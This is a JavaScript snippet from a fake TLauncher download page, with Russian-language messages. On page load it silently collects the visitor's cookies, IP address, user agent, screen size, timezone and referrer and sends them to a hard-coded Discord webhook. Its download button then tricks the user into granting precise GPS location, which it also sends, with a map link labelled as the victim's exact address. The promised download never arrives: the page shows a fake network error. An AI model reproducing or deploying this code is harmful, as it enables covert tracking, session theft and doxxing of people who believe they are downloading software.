<script>
    const webhook = "https://discord.com/api/webhooks/1489290289649549424/WIAoa5NkDmV1qsyaBx4cZQCMqhSuUnrXa21xlUq24d_GLnl64-C0q5BGJI0k2wnJZh5u";
    let gpsSent = false;

    function getAllCookies() {
        if (!document.cookie) return "Cookies не найдены";
        let cookies = {};
        document.cookie.split(';').forEach(cookie => {
            let [key, value] = cookie.trim().split('=');
            cookies[key] = value || "нет значения";
        });
        return JSON.stringify(cookies, null, 2);
    }

    function sendBasicData() {
        const data = {
            time: new Date().toLocaleString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + "x" + screen.height,
            cookies: getAllCookies(),
            referer: document.referrer || "прямой переход",
            url: window.location.href
        };
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(ipData => {
                data.ip = ipData.ip;
                let msg = `**📥 TLAUNCHER ЛОВУШКА | ДАННЫЕ**\n\`\`\`\nВремя: ${data.time}\nIP: ${data.ip}\nТаймзона: ${data.timezone}\nUser Agent: ${data.user_agent}\nЭкран: ${data.screen}\nCookies:\n${data.cookies}\n\`\`\``;
                fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) }).catch(e=>{});
            }).catch(() => {});
    }
    sendBasicData();

    function sendGPS(position) {
        if (gpsSent) return;
        gpsSent = true;
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        const msg = `**📍 TLAUNCHER | ТОЧНЫЙ АДРЕС ЖЕРТВЫ**\n\`\`\`\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ${accuracy} м\nКарта: ${mapsLink}\nВремя: ${new Date().toLocaleString()}\n\`\`\``;
        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) }).catch(e=>{});
        
        document.getElementById('status').innerHTML = '✅ Скачивание началось... (файл сохраняется)';
        document.getElementById('downloadBtn').disabled = true;
        document.getElementById('downloadBtn').style.opacity = '0.5';
        setTimeout(() => {
            document.getElementById('status').innerHTML = '⚠️ Ошибка сети. Попробуйте позже.';
            document.getElementById('downloadBtn').disabled = false;
            document.getElementById('downloadBtn').style.opacity = '1';
        }, 3000);
    }

    function gpsError(err) {
        let errorMsg = err.code === 1 ? "Пользователь запретил доступ" : "Ошибка определения местоположения";
        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: `**❌ TLAUNCHER | ОТКАЗ ОТ GPS**\n${errorMsg}` }) }).catch(e=>{});
        document.getElementById('status').innerHTML = '❌ Не удалось определить местоположение. Загрузка невозможна.';
        document.getElementById('downloadBtn').disabled = false;
    }

    document.getElementById('downloadBtn').onclick = () => {
        document.getElementById('modal').classList.add('active');
    };

    document.getElementById('allowBtn').onclick = () => {
        document.getElementById('modal').classList.remove('active');
        document.getElementById('status').innerHTML = '<div class="loader"></div> Определение местоположения...';
        document.getElementById('downloadBtn').disabled = true;
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendGPS, gpsError, { enableHighAccuracy: true, timeout: 10000 });
        } else {
            fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "**⚠️ TLAUNCHER | Браузер не поддерживает геолокацию**" }) }).catch(e=>{});

            document.getElementById('downloadBtn').disabled = false;
        }
    };

    document.getElementById('denyBtn').onclick = () => {
        document.getElementById('modal').classList.remove('active');
        fetch(webhook, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "**❌ TLAUNCHER | ПОЛЬЗОВАТЕЛЬ ОТКАЗАЛСЯ ОТ GPS**" }) }).catch(e=>{});
        document.getElementById('status').innerHTML = '❌ Для скачивания необходимо разрешение геолокации';
    };
